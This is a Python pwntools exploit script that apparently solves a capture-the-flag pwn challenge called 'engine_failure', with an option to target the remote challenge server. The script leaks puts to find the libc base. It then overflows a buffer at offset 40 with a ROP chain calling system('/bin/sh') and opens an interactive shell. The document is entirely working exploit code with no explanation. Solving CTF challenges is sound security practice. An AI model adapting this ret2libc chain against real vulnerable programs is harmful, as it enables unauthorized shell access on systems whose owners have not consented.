#!/usr/bin/env python3

from pwn import *

elf = ELF("./engine_failure.bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

OFFSET = 40

# https://github.com/david942j/one_gadget#to-python-lovers
def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def conn():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")
    else:
        return process([elf.path])


def main():
    io = conn()
    io.clean()
    io.sendline("2")
    io.recvuntil("Coordinates: ")

    puts_leak = int(io.recvline().strip(), 16)
    libc.address = puts_leak - libc.sym.puts
    rop = ROP([elf, libc])
    success(f"Leaked libc base: {hex(libc.address)}")

    rop.call(rop.ret.address)
    rop.system(next(libc.search(b"/bin/sh\0")))
    print(rop.dump())

    io.clean()
    io.sendline("1")
    io.clean()
    io.sendline("1")
    io.clean()
    io.fit({
        OFFSET: rop.chain()
        })
    io.interactive()


if __name__ == "__main__":
    main()
